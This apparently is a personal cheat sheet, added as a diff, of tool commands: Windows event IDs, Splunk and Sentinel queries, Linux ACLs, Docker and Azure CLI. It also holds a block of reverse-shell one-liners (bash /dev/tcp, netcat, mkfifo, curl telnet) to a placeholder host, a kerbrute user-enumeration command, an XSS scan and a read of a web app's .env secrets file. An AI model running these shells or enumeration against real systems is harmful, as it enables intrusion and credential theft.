+aws, aws ec2 describe-instances --instance-id i-0146854b7443af453 --query "Reservations[*].Instances[*].{State:State.Name,Address:PublicIpAddress}"
+
+windowsID, Event ID 4697 , This event generates when new service was installed in the system.
+windowsID, Event ID 106, This event is logged when the user registered the Task Scheduler task.
+windowsID, Event ID 4702, This event generates when scheduled task was updated.
+windowsID, Event ID 140,This event is logged when the time service has stopped advertising as a time source because the local machine is not an Active Directory Domain Controller.
+widnowsID, Event ID 4699, A scheduled task was deleted.
+widnowsID, Event ID 141, The time service has stopped advertising as a time source because there are no providers running.
+windowsID, Event ID 201, This event is logged when the task scheduler successfully completed the task.
+windowsID, Event ID 4697,A service was installed in the system.
+windowsID, Event ID 7045,Created when new services are created on the local Windows machine.
+windwosID, Event ID 7034,The service terminated unexpectedly.
+windowsID, Event ID 7036,The Windows Firewall/Internet Connection Sharing (ICS) service entered the stopped state or , The Print Spooler service entered the running state.
+windowsID, Event ID 7040, The start type of the IPSEC services was chnaged from disabled to auto start.
+windowsID, Event ID 1102, Whenever Windows Security audit log is cleared, event ID 1102 is logged.
+windowsID, Event ID 104 , This event is logged when the log file was cleared.
+windowsID, Event ID 4776, The domain controller attempted to validate the credentials for an account.
+windowsID, Event ID 4771,This event is logged on domain controllers only and only failure instances of this event are logged ( Kerberos pre-authentication failed ).
+windowsID, Event ID 4768, This event is logged on domain controllers only and both success and failure instances of this event are logged ( A Kerberos authentication ticket TGT ) was requested.
+windowsID, Event ID 4769,Windows uses this event ID for both successful and failed service ticket requests ( A Kerberos service ticket was requested ).
+windowsID, Event ID 4624 ,An account was successfully logged on.
+windowsID, Event ID 4625, An account failed to log on.
+windowsID, Event ID 4634 + 4647 , User initiated logoff/An account was logged off
+windowsID, Event ID 4648, A logon was attempted using explicit credentials
+windowsID, Event ID 4672,Special privileges assigned to new logon
+windowsID, Event ID 4720, A user account was created
+windowsID, Event ID 4722, A user account was enabled
+windowsID, Event ID 4724, An attempt was made to reset an accounts password
+windowsID, Event ID 4728/4732/4756, group membership changes.
+windowsID, Event ID 5140,A network share object was accessed
+windowsID, Event ID 5145, Network share object was checked to see whether client can be granted desired access.
+windowsID, Event ID 4657, A registry value was modified
+widnowsID, Event ID 4688, A new process has been created.
+windowsID, Event ID 4663, An attempt was made to access an object. - chyba jak kots czyta regedit registry sprawdzic.
+windowsID, Event ID 4670, Permissions on an object were changed.
+windowsID, Event ID 1, Process Create
+windowsID, Evnet ID 12, Registry object added or deleted:
+windowsID, Event ID 5154, The Windows Filtering Platform has permitted an application or service to listen on a port for incoming connections.
+windowsID, Evnet ID 13, Registry value set:
+windowsID, Evnet ID 3, Network connection detected
+windowsID, Event ID 11, File created:
+windowsID, Event ID 4103, Command line window
+windowsID, Event ID 4688, process been crated but here we can find command line from cmd.
+windowdID, Event ID 4103,to show all shell command
+windowsID, Event ID 4738, A user account was changed.” This event is logged
+
+kerbrute, /opt/kerbrute/dist/kerbrute_linux_amd64 userenum --dc win-services.services.local -d services.local user.lst
+
+brim,  | count() by host
+brim, _path=dce_rpc OR _path=smb_mapping OR _path=smb_files
+brim, filename!=null -- to show all files
+brim, _path=http | count() by uri | sort -r
+brim, put total_bytes = orig_bytes + resp_bytes | top 10 total_bytes | cut id, orig_bytes, resp_bytes, total_bytes
+
+
+iptables, sudo /sbin/iptables-save
+
+xxs, dalfox http://marketing.nahamstore.thm/?error=
+
+
+extra, cat /var/www/.env
+extra, vnc nie ma usera
+
+linux, setfacl -m u:username:rwx myfolder
+linux, sudo usermod -a -G groupname username
+
+splunk, | makeresults | eval cn = "3253-----2353----3253----3234" | rex max_match=0 field=cn "(?P<part>\d+)" | mvexpand  part | mvcombine part delim="-" | makemv part  -> gives one line with seperator
+splunk, | rex mode=sed "y/134/XXX/" liczby 123 bede zamienione na X troche inny regular expression
+splunk, | lookup    windows-event-id.csv EVENT_ID as EventCode  OUTPUT EVENT_DESCRIPTION   -> EventCode from search, Event_ID and Descrption from lookup  enrichment. 
+GA
+
+
+
+splunk, index=* EventCode=46*   | rename EventCode as EventID | search EventCode NOT   [ |inputlookup WL_EventID.csv| fields EventID ]  -> WL EventID field in the lookup blacklist for NOT [|inputlooup 
+splunk, | eval category= case(_raw like "%session opened for user%","success", _raw like "%ailed password for%","failed")
+splunk, EXTRACT-AttackVessel = ^\s+<AttackVessel>(?P<AttackVessel>[^<]+)
+splunk, SEDCMD-bremovefooter = s/\<\/dataroot\>//g
+splunk, REPORT-f = dream_attack
+splunk, [dream_attack]  -> REGEX = (?m)^[^<]+.(.*?)\>([\S\s]*?)\<(?=[^\s])     FORMAT = $1::$2
+splunk, sudo setfacl -m u:splunk:r /home/alice/.bash_history
+
+
+
+sentinel, summarize -> stats
+sentinel, project -> table
+sentinel, about structure -> getschema
+sentinel, change multivalue into raws -> | mv-expand a
+sentinel, condition int the search; let timeframe =1d;, | where TimeGanarated> ago(timeframe) ;;;;   let Events = dynamic (["aaa","bbb"]); | where EventName in(Events)
+sentinel, in~ Case Insensive Match
+sentinel, has_any chech for whole terms not substrinds in the values
+sentinel, contains search for substring
+sentinel, let reg = @'.*db';       | extend mka=iff(name matches regex reg,"11111","000")
+sentinel, | extend aaa = extract_all(@"sqlserver(?P<aaa>.*)",name)
+sentinel, declare your own data let SecurityEVENT = datatable(BB: string, AA: string) [  "4545", @"mka111", "3443", @"kulczycki" ]; SecurityEVENT | where BB == "4545" |project AA
+sentinel, _raw data |project pack_all()
+setfacl, setfacl -m u:userA:rx folder
+setfacl, setfacl -R -m u:userA:rX folder
+setfacl, setfacl -d -m u::rw file -  Modify default ACL of a file for all users:
+setfact, setfacl -x u:username file - remove 
+setfacl, setfacl -b file Remove all ACL entries of a file:
+
+shell, sh -i >& /dev/tcp/0.0.0.0/9000 0>&1
+shell, 0<&196;exec 196<>/dev/tcp/0.0.0.0/9000; sh <&196 >&196 2>&196
+shell, exec 5<>/dev/tcp/0.0.0.0/9000;cat <&5 | while read line; do $line 2>&5 >&5;  done
+shell, sh -i 5<> /dev/tcp/0.0.0.0/9000 0<&5 1>&5 2>&5
+shell, sh -i >& /dev/udp/0.0.0.0/9000 0>&1
+shell, rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 0.0.0.0 9000 >/tmp/f
+shell, nc 0.0.0.0 9000 -e sh
+shell, nc.exe 0.0.0.0 9000 -e sh
+shell, busybox nc 0.0.0.0 9000 -e sh
+shell, nc -c sh 0.0.0.0 9000
+shell, ncat 0.0.0.0 9000 -e sh
+shell, ncat.exe 0.0.0.0 9000 -e sh
+shell, rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u 0.0.0.0 9000 >/tmp/f
+shell, C='curl -Ns telnet://0.0.0.0:9000'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null
+shell, rcat connect -s sh 0.0.0.0 9000
+shell, https://www.revshells.com/
+shell, bash -c nohup bash -i >& /dev/tcp/0.0.0.0/9000 0>&1 &
+
+
+
+
+
+powershell, Start-Process powershell -Verb runAs
+
+bat, @echo off
+bat, title This is your first batch script!
+bat, echo Welcome to batch scripting!
+bat, pause
+
+
+wfuzz,  wfuzz -z list,GET-HEAD-POST-TRACE-OPTIONS -X FUZZ http://testphp.vulnweb.com/
+wfuzz,  wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --sc 200,202,204,301,302,307,403 http://example.com/uploads/FUZZ
+wfuzz, wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --hc 400,404,403 -H "Host: FUZZ.example.com" -u http://example.com -t 100
+
+update, cat /home/cat/Desktop/variable.txt   | bash
+update, vi /home/cat/Desktop/variable.txt
+update, sudo sed  -i s/10.10.182.225/1.1.1.1/g /data/pentest/knowlege_base.csv 
+
+markdown, <img title="a ddddd" alt="Alt text" src="../images/table.png">
+markdown, ![Alt text](../images/table.png)
+markdown, ![Alt text](data:image/png;base64,herecode_base64)
+
+docker, docker exec -it <mycontainer> sh
+docker, docker cp CONTAINER:/var/logs/ /tmp/app_logs
+docker, docker cp ./some_file CONTAINER:/work
+docker, docker cp foo.txt container_id:/foo.txt
+docker, docker run -d -p 8000:8000 -e "SPLUNK_START_ARGS=--accept-license" -e "SPLUNK_PASSWORD=<password>" --name splunk splunk/splunk:latest
+
+
+
+audio, pulseaudio --start
+audio, pulseaudio -k
+audio, systemctl --user restart pipewire pipewire-pulse
+audio, systemctl --user restart pipewire.socket pipewire-pulse.socket
+audio, pactl info
+
+es, etxkbmap us intl
+
+azure, az login, Log in to Azure.
+azure, az account list, List all subscriptions for your account.
+azure, az account set --subscription "MySub", Set the active subscription.
+azure, az account show, Show details of the current subscription.
+azure, az configure, Set default arguments like location or group.
+azure, az version, Show current version of Azure CLI and extensions.
+azure, az upgrade, Upgrade Azure CLI to the latest version.
+azure, az logout, Log out of Azure.
+azure, az group create --name MyRG --location eastus, Create a new resource group.
+azure, az group list, List all resource groups.
+azure, az group delete --name MyRG, Delete a resource group.
+azure, az tag create --resource-id /subscriptions/.../MyRG --tags Dept=Finance, Apply a tag to a resource.
+azure, az resource list --resource-group MyRG, List all resources within a specific group.
+azure, az resource move --destination-group NewRG --ids $id, Move a resource to another group.
+azure, az vm create --resource-group MyRG --name MyVM --image Ubuntu2204, Create a Linux VM.
+azure, az vm list --resource-group MyRG, List all VMs in a resource group.
+azure, az vm start --name MyVM --resource-group MyRG, Start a stopped VM.
+azure, az vm stop --name MyVM --resource-group MyRG, Stop a running VM.
+azure, az vm restart --name MyVM --resource-group MyRG, Restart a VM.
+azure, az vm delete --name MyVM --resource-group MyRG, Delete a VM.
+azure, az vm show --name MyVM --resource-group MyRG, Get VM details.
+azure, az vm extension set --resource-group MyRG --vm-name MyVM --name customScript, Install an extension.
+azure, az aks create --resource-group MyRG --name MyAKS --node-count 3, Create an AKS cluster.
+azure, az aks get-credentials --resource-group MyRG --name MyAKS, Connect to an AKS cluster.
+azure, az network vnet create --resource-group MyRG --name MyVNet --address-prefix 10.0.0.0/16, Create a virtual network.
+azure, az network nsg create --resource-group MyRG --name MyNSG, Create a Network Security Group.
+azure, az network nsg rule create --nsg-name MyNSG --name AllowSSH --priority 1000, Add a rule to an NSG.
+azure, az network public-ip create --resource-group MyRG --name MyPublicIP, Create a public IP address.
+azure, az network dns zone create --resource-group MyRG --name "contoso.com", Create a DNS zone.
+azure, az storage account create --name mystorageacct --resource-group MyRG --sku Standard_LRS, Create a storage account.
+azure, az storage account list, List storage accounts.
+azure, az storage container create --account-name mystorageacct --name mycontainer, Create a blob container.
+azure, az storage blob upload --account-name mystorageacct --container-name mycontainer --name myfile.txt --file ./myfile.txt, Upload a file to blob storage.
+azure, az storage account keys list --account-name mystorageacct, List access keys for a storage account.
+azure, az keyvault create --name MyVault --resource-group MyRG, Create a Key Vault.
+azure, az keyvault secret set --vault-name MyVault --name "MySecret" --value "Password123", Store a secret in Key Vault.
+azure, az keyvault secret show --vault-name MyVault --name "MySecret", Retrieve a secret.
+azure, az role assignment create --assignee user@domain.com --role Contributor --scope /subscriptions/..., Assign a role to a user.
+azure, az ad user create --display-name "New User" --user-principal-name newuser@domain.com, Create an Azure AD user.
+azure, az webapp create --resource-group MyRG --plan MyPlan --name MyApp --runtime "NODE:14LTS", Create a Web App.
+azure, az webapp deployment source config --name MyApp --resource-group MyRG --repo-url <git_url>, Set up CI/CD for a Web App.
+azure, az functionapp create --resource-group MyRG --name MyFunctionApp --storage-account mystorageacct, Create a Function App.
+azure, az sql server create --resource-group MyRG --name mysqlserver --admin-user myadmin --admin-password Passw0rd, Create a SQL server.
+azure, az sql db create --resource-group MyRG --server mysqlserver --name mydb --service-objective S0, Create a SQL database.
+azure, az monitor metrics list --resource /subscriptions/.../MyVM --metric "Percentage CPU", Get metrics for a resource.
+azure, az monitor activity-log list --resource-group MyRG, View the activity log for a resource group.
+azure, az monitor diagnostic-settings create --resource MyVM --name settings --storage-account mystorageacct, Archive diagnostic logs.
+azure, az resource show --name MyVM --resource-group MyRG --query "properties.provisioningState", Check a resource's provisioning state.
+azure, az vm list --output table, Format output as a table.
+azure, az vm list --query "[].name", Use JMESPath query to filter specific data.
+
+
